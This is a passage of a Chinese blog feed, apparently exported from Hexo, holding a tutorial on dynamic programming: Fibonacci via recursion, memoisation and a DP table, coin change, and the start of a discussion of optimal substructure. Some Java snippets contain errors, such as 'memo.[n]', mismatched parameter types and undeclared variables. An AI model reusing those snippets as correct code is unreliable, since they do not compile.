class="hljs-number">1</span>;<br>        <span class="hljs-keyword">int</span> val = booking[<span class="hljs-number">2</span>];<br>        <span class="hljs-comment">// 对区间 nums[i..j] 增加 val</span><br>        df.increment(i, j, val);<br>    &#125;<br>    <span class="hljs-comment">// 返回最终的结果数组</span><br>    <span class="hljs-keyword">return</span> df.result();<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">数组的相关技巧，包括二分查找，双指针，滑动窗口，前缀和等</summary>
    
    
    
    <category term="算法" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="http://example.com/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="数组" scheme="http://example.com/tags/%E6%95%B0%E7%BB%84/"/>
    
    <category term="二分查找" scheme="http://example.com/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"/>
    
    <category term="双指针" scheme="http://example.com/tags/%E5%8F%8C%E6%8C%87%E9%92%88/"/>
    
    <category term="滑动窗口" scheme="http://example.com/tags/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"/>
    
  </entry>
  
  <entry>
    <title>动态规划</title>
    <link href="http://example.com/2021/02/20/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    <id>http://example.com/2021/02/20/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</id>
    <published>2021-02-19T16:13:27.000Z</published>
    <updated>2021-03-11T11:48:20.509Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-动态规划详解"><a href="#1-动态规划详解" class="headerlink" title="1. 动态规划详解"></a>1. 动态规划详解</h1><p><strong>首先，动态规划问题的一般形式就是求最值</strong>。动态规划其实是运筹学的一种最优化方法，只不过在计算机问题上应用比较多，比如说让你求<strong>最长</strong>递增子序列呀，<strong>最小</strong>编辑距离呀等等。</p><p>既然是要求最值，核心问题是什么呢？<strong>求解动态规划的核心问题是穷举</strong>。因为要求最值，肯定要把所有可行的答案穷举出来，然后在其中找最值呗。</p><p>动态规划这么简单，就是穷举就完事了？我看到的动态规划问题都很难啊！</p><p>首先，动态规划的穷举有点特别，因为这类问题<strong>存在「重叠子问题」</strong>，如果暴力穷举的话效率会极其低下，所以需要「备忘录」或者「DP table」来优化穷举过程，避免不必要的计算。</p><p>而且，动态规划问题一定会<strong>具备「最优子结构」</strong>，才能通过子问题的最值得到原问题的最值。</p><p>另外，虽然动态规划的核心思想就是穷举求最值，但是问题可以千变万化，穷举所有可行解其实并不是一件容易的事，只有列出<strong>正确的「状态转移方程」</strong>才能正确地穷举。</p><p>以上提到的重叠子问题、最优子结构、状态转移方程就是动态规划三要素。具体什么意思等会会举例详解，但是在实际的算法问题中，<strong>写出状态转移方程是最困难的</strong>，这也就是为什么很多朋友觉得动态规划问题困难的原因，我来提供我研究出来的一个思维框架，辅助你思考状态转移方程：</p><p><strong>明确 base case -&gt; 明确「状态」-&gt; 明确「选择」 -&gt; 定义 dp 数组/函数的含义</strong>。</p><p>按上面的套路走，最后的结果就可以套这个框架：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"># 初始化 base case<br>dp[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>][...] = base<br># 进行状态转移<br><span class="hljs-keyword">for</span> 状态<span class="hljs-number">1</span> in 状态<span class="hljs-number">1</span>的所有取值：<br>    <span class="hljs-keyword">for</span> 状态<span class="hljs-number">2</span> in 状态<span class="hljs-number">2</span>的所有取值：<br>        <span class="hljs-keyword">for</span> ...<br>            dp[状态<span class="hljs-number">1</span>][状态<span class="hljs-number">2</span>][...] = 求最值(选择<span class="hljs-number">1</span>，选择<span class="hljs-number">2.</span>..)<br></code></pre></td></tr></table></figure><p>下面通过斐波那契数列问题和凑零钱问题来详解动态规划的基本原理。前者主要是让你明白什么是重叠子问题（斐波那契数列没有求最值，所以严格来说不是动态规划问题），后者主要举集中于如何列出状态转移方程。</p><h2 id="1-1-斐波那契数列"><a href="#1-1-斐波那契数列" class="headerlink" title="1.1 斐波那契数列"></a>1.1 斐波那契数列</h2><p>请读者不要嫌弃这个例子简单，<strong>只有简单的例子才能让你把精力充分集中在算法背后的通用思想和技巧上，而不会被那些隐晦的细节问题搞的莫名其妙</strong>。想要困难的例子，历史文章里有的是。</p><p><strong>1、暴力递归</strong></p><p>斐波那契数列的数学形式就是递归的，写成代码就是这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fib</span><span class="hljs-params">(<span class="hljs-keyword">int</span> N)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (N == <span class="hljs-number">1</span> || N == <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> fib(N - <span class="hljs-number">1</span>) + fib(N - <span class="hljs-number">2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个不用多说了，学校老师讲递归的时候似乎都是拿这个举例。我们也知道这样写代码虽然简洁易懂，但是十分低效，低效在哪里？假设 n = 20，请画出递归树：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/12" style="zoom: 50%;" /></p><p>PS：但凡遇到需要递归的问题，最好都画出递归树，这对你分析算法的复杂度，寻找算法低效的原因都有巨大帮助。</p><p>这个递归树怎么理解？就是说想要计算原问题 <code>f(20)</code>，我就得先计算出子问题 <code>f(19)</code> 和 <code>f(18)</code>，然后要计算 <code>f(19)</code>，我就要先算出子问题 <code>f(18)</code> 和 <code>f(17)</code>，以此类推。最后遇到 <code>f(1)</code> 或者 <code>f(2)</code> 的时候，结果已知，就能直接返回结果，递归树不再向下生长了。</p><p><strong>递归算法的时间复杂度怎么计算？就是用子问题个数乘以解决一个子问题需要的时间。</strong></p><p>首先计算子问题个数，即递归树中节点的总数。显然二叉树节点总数为指数级别，所以子问题个数为 O(2^n)。</p><p>然后计算解决一个子问题的时间，在本算法中，没有循环，只有 <code>f(n - 1) + f(n - 2)</code> 一个加法操作，时间为 O(1)。</p><p>所以，这个算法的时间复杂度为二者相乘，即 O(2^n)，指数级别，爆炸。</p><p>观察递归树，很明显发现了算法低效的原因：存在大量重复计算，比如 <code>f(18)</code> 被计算了两次，而且你可以看到，以 <code>f(18)</code> 为根的这个递归树体量巨大，多算一遍，会耗费巨大的时间。更何况，还不止 <code>f(18)</code> 这一个节点被重复计算，所以这个算法及其低效。</p><p>这就是动态规划问题的第一个性质：<strong>重叠子问题</strong>。下面，我们想办法解决这个问题。</p><p><strong>2、带备忘录的递归解法</strong></p><p>明确了问题，其实就已经把问题解决了一半。即然耗时的原因是重复计算，那么我们可以造一个「备忘录」，每次算出某个子问题的答案后别急着返回，先记到「备忘录」里再返回；每次遇到一个子问题先去「备忘录」里查一查，如果发现之前已经解决过这个问题了，直接把答案拿出来用，不要再耗时去计算了。</p><p>一般使用一个数组充当这个「备忘录」，当然你也可以使用哈希表（字典），思想都是一样的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span>[] memo;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">fib</span><span class="hljs-params">(<span class="hljs-keyword">int</span> N)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (N &lt; <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 备忘录全初始化为 0</span><br>    memo = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n + <span class="hljs-number">1</span>];<br>    Arrays.fill(memo, <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// 进行带备忘录的递归</span><br>    <span class="hljs-keyword">return</span> helper(memo, N);<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">helper</span><span class="hljs-params">(List&lt;Integer&gt; memo, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    <span class="hljs-comment">// base case </span><br>    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">1</span> || n == <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// 已经计算过</span><br>    <span class="hljs-keyword">if</span> (memo.[n] != <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> memo[n];<br>    memo[n] = helper(memo, n - <span class="hljs-number">1</span>) + helper(memo, n - <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">return</span> memo[n];<br>&#125;<br></code></pre></td></tr></table></figure><p>现在，画出递归树，你就知道「备忘录」到底做了什么。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/11" style="zoom:50%;" /></p><p>实际上，带「备忘录」的递归算法，把一棵存在巨量冗余的递归树通过「剪枝」，改造成了一幅不存在冗余的递归图，极大减少了子问题（即递归图中节点）的个数。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/0" style="zoom:50%;" /></p><p><strong>递归算法的时间复杂度怎么计算？就是用子问题个数乘以解决一个子问题需要的时间。</strong></p><p>子问题个数，即图中节点的总数，由于本算法不存在冗余计算，子问题就是 <code>f(1)</code>, <code>f(2)</code>, <code>f(3)</code> … <code>f(20)</code>，数量和输入规模 n = 20 成正比，所以子问题个数为 O(n)。</p><p>解决一个子问题的时间，同上，没有什么循环，时间为 O(1)。</p><p>所以，本算法的时间复杂度是 O(n)。比起暴力算法，是降维打击。</p><p>至此，带备忘录的递归解法的效率已经和迭代的动态规划解法一样了。实际上，这种解法和迭代的动态规划已经差不多了，只不过这种方法叫做「<strong>自顶向下</strong>」，动态规划叫做「<strong>自底向上</strong>」。</p><p>啥叫「自顶向下」？注意我们刚才画的递归树（或者说图），是从上向下延伸，都是从一个规模较大的原问题比如说 <code>f(20)</code>，向下逐渐分解规模，直到 <code>f(1)</code> 和 <code>f(2)</code> 这两个 base case，然后逐层返回答案，这就叫「自顶向下」。</p><p>啥叫「自底向上」？反过来，我们直接从最底下，最简单，问题规模最小的 <code>f(1)</code> 和 <code>f(2)</code> 开始往上推，直到推到我们想要的答案 <code>f(20)</code>，这就是动态规划的思路，<strong>这也是为什么动态规划一般都脱离了递归，而是由循环迭代完成计算。</strong></p><p><strong>3、dp 数组的迭代解法</strong></p><p>有了上一步「备忘录」的启发，我们可以把这个「备忘录」独立出来成为一张表，就叫做 DP table 吧，在这张表上完成「自底向上」的推算岂不美哉！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">fib</span><span class="hljs-params">(<span class="hljs-keyword">int</span> N)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (N == <span class="hljs-number">0</span> || N == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> N;<br>    dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n + <span class="hljs-number">1</span>];<br>    Arrays.fill(dp, <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// base case</span><br>    dp[<span class="hljs-number">1</span>] = dp[<span class="hljs-number">2</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">3</span>; i &lt;= N; i++)<br>        dp[i] = dp[i - <span class="hljs-number">1</span>] + dp[i - <span class="hljs-number">2</span>];<br>    <span class="hljs-keyword">return</span> dp[N];<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/9" style="zoom:50%;" /></p><p>画个图就很好理解了，而且你发现这个 DP table 特别像之前那个「剪枝」后的结果，只是反过来算而已。实际上，带备忘录的递归解法中的「备忘录」，最终完成后就是这个 DP table，所以说这两种解法其实是差不多的，大部分情况下，效率也基本相同。</p><p>这里，引出「状态转移方程」这个名词，实际上就是描述问题结构的数学形式：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/8" alt=""></p><p>为啥叫「状态转移方程」？其实就是为了听起来高端。你把 <code>f(n)</code> 想做一个状态 <code>n</code>，这个状态 <code>n</code> 是由状态 <code>n - 1</code> 和状态 <code>n - 2</code> 相加转移而来，这就叫状态转移，仅此而已。</p><p>你会发现，上面的几种解法中的所有操作，例如 <code>return f(n - 1) + f(n - 2)</code>，<code>dp[i] = dp[i - 1] + dp[i - 2]</code>，以及对备忘录或 DP table 的初始化操作，都是围绕这个方程式的不同表现形式。可见列出「状态转移方程」的重要性，它是解决问题的核心。而且很容易发现，其实状态转移方程直接代表着暴力解法。</p><p><strong>千万不要看不起暴力解，动态规划问题最困难的就是写出这个暴力解，即状态转移方程</strong>。只要写出暴力解，优化方法无非是用备忘录或者 DP table，再无奥妙可言。</p><p>这个例子的最后，讲一个细节优化。细心的读者会发现，根据斐波那契数列的状态转移方程，当前状态只和之前的两个状态有关，其实并不需要那么长的一个 DP table 来存储所有的状态，只要想办法存储之前的两个状态就行了。所以，可以进一步优化，把空间复杂度降为 O(1)：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fib</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">2</span> || n == <span class="hljs-number">1</span>) <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> prev = <span class="hljs-number">1</span>, curr = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">3</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-keyword">int</span> sum = prev + curr;<br>        prev = curr;<br>        curr = sum;<br>    &#125;<br>    <span class="hljs-keyword">return</span> curr;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个技巧就是所谓的「<strong>状态压缩</strong>」，如果我们发现每次状态转移只需要 DP table 中的一部分，那么可以尝试用状态压缩来缩小 DP table 的大小，只记录必要的数据，上述例子就相当于把DP table 的大小从 <code>n</code> 缩小到 2。后续的动态规划章节中我们还会看到这样的例子，一般来说是把一个二维的 DP table 压缩成一维，即把空间复杂度从 O(n^2) 压缩到 O(n)。</p><p>有人会问，动态规划的另一个重要特性「最优子结构」，怎么没有涉及？下面会涉及。斐波那契数列的例子严格来说不算动态规划，因为没有涉及求最值，以上旨在说明重叠子问题的消除方法，演示得到最优解法逐步求精的过程。下面，看第二个例子，凑零钱问题。</p><h2 id="1-2-凑零钱问题"><a href="#1-2-凑零钱问题" class="headerlink" title="1.2 凑零钱问题"></a>1.2 凑零钱问题</h2><p>先看下题目：给你 <code>k</code> 种面值的硬币，面值分别为 <code>c1, c2 ... ck</code>，每种硬币的数量无限，再给一个总金额 <code>amount</code>，问你<strong>最少</strong>需要几枚硬币凑出这个金额，如果不可能凑出，算法返回 -1 。算法的函数签名如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">// coins 中是可选硬币面值，amount 是目标金额</span><br><span class="hljs-built_in">int</span> coin<span class="hljs-constructor">Change(<span class="hljs-params">int</span>[] <span class="hljs-params">coins</span>, <span class="hljs-params">int</span> <span class="hljs-params">amount</span>)</span>;<br></code></pre></td></tr></table></figure><p>比如说 <code>k = 3</code>，面值分别为 1，2，5，总金额 <code>amount = 11</code>。那么最少需要 3 枚硬币凑出，即 11 = 5 + 5 + 1。</p><p>你认为计算机应该如何解决这个问题？显然，就是把所有可能的凑硬币方法都穷举出来，然后找找看最少需要多少枚硬币。</p><p><strong>1、动态规划递归（记忆化搜索）</strong></p><p>首先，这个问题是动态规划问题，因为它具有「最优子结构」的。<strong>要符合「最优子结构」，子问题间必须互相独立</strong>。啥叫相互独立？你肯定不想看数学证明，我用一个直观的例子来讲解。</p><p>比如说，假设你考试，每门科目的成绩都是互相独立的。你的原问题是考出最高的总成绩，那么你的子问题就是要把语文考到最高，数学考到最高…… 为了每门课考到最高，你要把每门课相应的选择题分数拿到最高，填空题分数拿到最高…… 当然，最终就是你每门课都是满分，这就是最高的总成绩。</p><p>得到了正确的结果：最高的总成绩就是总分。因为这个过程符合最优子结构，“每门科目考到最高”这些子问题是互相独立，互不干扰的。</p><p>但是，如果加一个条件：你的语文成绩和数学成绩会互相制约，数学分数高，语文分数就会降低，反之亦然。这样的话，显然你能考到的最高总成绩就达不到总分了，按刚才那个思路就会得到错误的结果。因为子问题并不独立，语文数学成绩无法同时最优，所以最优子结构被破坏。</p><p>回到凑零钱问题，为什么说它符合最优子结构呢？比如你想求 <code>amount = 11</code> 时的最少硬币数（原问题），如果你知道凑出 <code>amount = 10</code> 的最少硬币数（子问题），你只需要把子问题的答案加一（再选一枚面值为 1 的硬币）就是原问题的答案。因为硬币的数量是没有限制的，所以子问题之间没有相制约，是互相独立的。</p><p>PS：关于最优子结构的问题，后文<a href="https://labuladong.gitbook.io/algo">动态规划答疑篇</a> 还会再举例探讨。</p><p>那么，既然知道了这是个动态规划问题，就要思考<strong>如何列出正确的状态转移方程</strong>？</p><p>1、<strong>确定 base case</strong>，这个很简单，显然目标金额 <code>amount</code> 为 0 时算法返回 0，因为不需要任何硬币就已经凑出目标金额了。</p><p>2、<strong>确定「状态」，也就是原问题和子问题中会变化的变量</strong>。由于硬币数量无限，硬币的面额也是题目给定的，只有目标金额会不断地向 base case 靠近，所以唯一的「状态」就是目标金额 <code>amount</code>。</p><p>3、<strong>确定「选择」，也就是导致「状态」产生变化的行为</strong>。目标金额为什么变化呢，因为你在选择硬币，你每选择一枚硬币，就相当于减少了目标金额。所以说所有硬币的面值，就是你的「选择」。</p><p>4、<strong>明确 <code>dp</code> 函数/数组的定义</strong>。我们这里讲的是自顶向下的解法，所以会有一个递归的 <code>dp</code> 函数，一般来说函数的参数就是状态转移中会变化的量，也就是上面说到的「状态」；函数的返回值就是题目要求我们计算的量。就本题来说，状态只有一个，即「目标金额」，题目要求我们计算凑出目标金额所需的最少硬币数量。所以我们可以这样定义 <code>dp</code> 函数：</p><p><code>dp(n)</code> 的定义：输入一个目标金额 <code>n</code>，返回凑出目标金额 <code>n</code> 的最少硬币数量。</p><p>至此，状态转移方程其实已经完成了，以上算法已经是暴力解法了，以上代码的数学形式就是状态转移方程：</p><p><img src="https://gblobscdn.gitbook.com/assets%2F-MS38NtlQPprrWHTMIJv%2Fsync%2F5381a5e30482682c1c6f111e882991113b8661f7.png?alt=media" style="zoom: 67%;" /></p><p>至此，这个问题其实就解决了，只不过需要消除一下重叠子问题，比如 <code>amount = 11, coins = &#123;1,2,5&#125;</code> 时画出递归树看看：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/7" alt="img" style="zoom:50%;" /></p><p>搞清楚上面这几个关键点，解法就可以写出来了：</p><p>dp函数的递归解法（<strong>自顶向下</strong>的方法，leetcode称作记忆化搜索）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] memo;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">coinChange</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] coins, <span class="hljs-keyword">int</span> amount)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(coins.length == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>        &#125;<br>        memo = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[amount];<br><br>        <span class="hljs-keyword">return</span> dp(coins,amount);<br>    &#125;<br>    <span class="hljs-comment">// memo[n] 表示钱币n可以被换取的最少的硬币数，不能换取就为-1</span><br>    <span class="hljs-comment">// dp函数的目的是为了找到 amount数量的零钱可以兑换的最少硬币数量，返回其值int</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">dp</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] coins,<span class="hljs-keyword">int</span> amount)</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(amount &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(amount == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-comment">// 记忆化的处理，memo[n]用赋予了值，就不用继续下面的循环</span><br>        <span class="hljs-comment">// 直接的返回memo[n] 的最优值</span><br>        <span class="hljs-keyword">if</span>(memo[amount-<span class="hljs-number">1</span>] != <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> memo[amount-<span class="hljs-number">1</span>];<br>        &#125;<br>        <span class="hljs-keyword">int</span> min = Integer.MAX_VALUE;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt; coins.length;i++)&#123;<br>            <span class="hljs-keyword">int</span> res = dp(coins,amount-coins[i]);<br>            <span class="hljs-keyword">if</span>(res &gt;= <span class="hljs-number">0</span> &amp;&amp; res &lt; min)&#123;<br>                min = res + <span class="hljs-number">1</span>; <span class="hljs-comment">// 加1，是为了加上得到res结果的那个步骤中，兑换的一个硬币</span><br>            &#125;<br>        &#125;<br>        memo[amount-<span class="hljs-number">1</span>] = (min == Integer.MAX_VALUE ? -<span class="hljs-number">1</span> : min);<br>        <span class="hljs-keyword">return</span> memo[amount-<span class="hljs-number">1</span>];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>递归算法的时间复杂度分析：子问题总数 x 每个子问题的时间</strong>。</p><p>时间复杂度：O(Sn)，其中 S 是金额，n 是面额数。我们一共需要计算 S 个状态的答案，且每个状态 F(S) 由于上面的记忆化的措施只计算了一次，而计算一个状态的答案需要枚举 n 个面额值，所以一共需要 O(Sn) 的时间复杂度。<br>空间复杂度：O(S)，我们需要额外开一个长为 S 的数组来存储计算出来的答案 F(S) 。</p><p><strong>2、动态规划迭代（递推）</strong></p><p>当然，我们也可以<strong>自底向上</strong>使用 dp table 来消除重叠子问题，关于「状态」「选择」和 base case 与之前没有区别，<code>dp</code> 数组的定义和刚才 <code>dp</code> 函数类似，也是把「状态」，也就是目标金额作为变量。不过 <code>dp</code> 函数体现在函数参数，而 <code>dp</code> 数组体现在数组索引：</p><p><strong><code>dp</code> 数组的定义：当目标金额为 <code>i</code> 时，至少需要 <code>dp[i]</code> 枚硬币凑出</strong>。</p><p>dp数组的迭代解法（递推）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">coinChange</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] coins, <span class="hljs-keyword">int</span> amount)</span> </span>&#123;<br><span class="hljs-keyword">int</span> max = amount + <span class="hljs-number">1</span>;<br><span class="hljs-comment">//dp[i]含义是金额为i的最少硬币数量</span><br>    <span class="hljs-keyword">int</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[amount + <span class="hljs-number">1</span>];<br>    Arrays.fill(dp, max);<br>    <span class="hljs-comment">//初始化</span><br>    dp[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//状态转移方程</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= amount; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; coins.length; j++) &#123;<br>    <span class="hljs-comment">//硬币面额小于目标金额计算，否则跳过</span><br>        <span class="hljs-keyword">if</span> (coins[j] &lt;= i) &#123;<br>            dp[i] = Math.min(dp[i], dp[i - coins[j]] + <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>     &#125;<br>        <span class="hljs-keyword">return</span> dp[amount] &gt; amount ? -<span class="hljs-number">1</span> : dp[amount];<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/6" style="zoom:50%;" /></p><p>PS：为啥 <code>dp</code> 数组初始化为 <code>amount + 1</code> 呢，因为凑成 <code>amount</code> 金额的硬币数最多只可能等于 <code>amount</code>（全用 1 元面值的硬币），所以初始化为 <code>amount + 1</code> 就相当于初始化为正无穷，便于后续取最小值。</p><h2 id="1-3-最后总结"><a href="#1-3-最后总结" class="headerlink" title="1.3 最后总结"></a>1.3 最后总结</h2><p>第一个斐波那契数列的问题，解释了如何通过「备忘录」或者「dp table」的方法来优化递归树，并且明确了这两种方法本质上是一样的，只是自顶向下和自底向上的不同而已。</p><p>第二个凑零钱的问题，展示了如何流程化确定「状态转移方程」，只要通过状态转移方程写出暴力递归解，剩下的也就是优化递归树，消除重叠子问题而已。</p><p><strong>计算机解决问题其实没有任何奇技淫巧，它唯一的解决办法就是穷举</strong>，穷举所有可能性。算法设计无非就是先思考“如何穷举”，然后再追求“如何聪明地穷举”。</p><p>列出动态转移方程，就是在解决“如何穷举”的问题。之所以说它难，一是因为很多穷举需要递归实现，二是因为有的问题本身的解空间复杂，不那么容易穷举完整。</p><p>备忘录、DP table 就是在追求“如何聪明地穷举”。用空间换时间的思路，是降低时间复杂度的不二法门，除此之外，试问，还能玩出啥花活？</p><h1 id="2-动态规划答疑篇"><a href="#2-动态规划答疑篇" class="headerlink" title="2. 动态规划答疑篇"></a>2. 动态规划答疑篇</h1><p>1、到底什么才叫「最优子结构」，和动态规划什么关系。</p><p>2、为什么动态规划遍历 <code>dp</code> 数组的方式五花八门，有的正着遍历，有的倒着遍历，有的斜着遍历。</p><h2 id="2-1-最优子结构详解"><a href="#2-1-最优子结构详解" class="headerlink" title="2.1 最优子结构详解"></a>2.1 最优子结构详解</h2><p>「最优子结构」是某些问题的一种特定性质，并不是动态规划问题专有的。也就是说，很多问题其实都具有最优子结构，只是其中大部分不具有重叠子问题，所以我们不把它们归为动态规划系列问题而已。</p><p>先举个很容易理解的例子：假设你们学校有 10 个班，你已经计算出了每个班的最高考试成绩。那么现在我要求你计算全校最高的成绩，你会不会算？当然会，而且你不用重新遍历全校学生的分数进行比较，而是只要在这 10 个最高成绩中取最大的就是全校的最高成绩。</p><p>我给你提出的这个问题就<strong>符合最优子结构</strong>：可以从子问题的最优结果推出更大规模问题的最优结果。让你算<strong>每个班</strong>的最优成绩就是子问题，你知道所有子问题的答案后，就可以借此推出<strong>全校</strong>学生的最优成绩这个规模更大的问题的答案。</p><p>你看，这么简单的问题都有最优子结构性质，只是因为显然没有重叠子问题，所以我们简单地求最值肯定用不出动态规划。</p><p>再举个例子：假设你们学校有 10 个班，你已知每个班的最大分数差（最高分和最低分的差值）。那么现在我让你计算全校学生中的最大分数差，你会不会算？可以想办法算，但是肯定不能通过已知的这 10 个班的最大分数差推到出来。因为这 10 